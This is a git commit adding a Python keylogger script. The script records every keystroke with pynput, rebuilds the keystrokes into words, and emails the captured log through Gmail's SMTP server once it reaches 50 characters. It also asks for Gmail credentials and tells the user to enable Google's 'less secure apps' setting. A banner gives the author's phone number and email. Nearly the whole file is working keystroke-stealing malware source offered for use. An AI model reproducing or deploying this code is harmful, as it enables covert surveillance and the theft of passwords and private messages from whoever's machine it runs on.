df36ef8aa714e69a375892de363a9ddefde3ac17
Likhithsai2580 <62712260+Likhithsai2580@users.noreply.github.com>
2020-10-06 02:24:06 -0700

    Create keyloggers.py

---
+++ keyloggers.py
@@ -0,0 +1,62 @@
+import getpass
+import smtplib
+
+from pynput.keyboard import Key, Listener
+
+print(''' 
+HACKERS ARE HERE WHERE ARE YOU
+                                                      ''')
+
+
+print('''┌═════════════════════════════════════════════════════════════════════════════┐
+█               Author: S LIKHITH SAI (HACKERS ARE HERE WHERE ARE YOU                  █
+█                                                                                      █
+█                LEARN ETHICAL HACKING IN TELUGU(తెలుగులో)                               █
+█                                                                                      █ 
+█                    PH.NO : 9493516497  EMAIL:semalalikithsai@gmail.com               █
+└══════════════════════════════════════════════════════════════════════════════════════┘ 
+  ''')
+
+print ("please enable in this website before you give email to me https://myaccount.google.com/lesssecureapps")
+email = input('Enter email : ')
+password = getpass.getpass(prompt='password: ', stream=None)
+server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+server.login(email, password)
+
+full_log = ''
+word = ''
+email_char_limt = 50
+
+def on_press(key):
+	global word
+	global full_log
+	global email
+	global email_char_limt
+
+	if key == Key.space or key == Key.enter:
+		word += ' '
+		full_log +=word
+		word = ''
+		if len(full_log) >= email_char_limt:
+			send_log()
+			full_log = ''
+	elif key == Key.shift_l or key == Key.shift_r:
+		return
+	elif key == Key.backspace:
+		word = word[:-1]
+	else:
+		char = f'{key}'
+		char = char[1:-1]
+		word += char
+	if key == Key.esc:
+		return false
+
+def send_log():
+	server.sendmail(
+		email,
+		email,
+		full_log
+	)
+
+with Listener( on_press=on_press ) as listener:
+	listener.join()
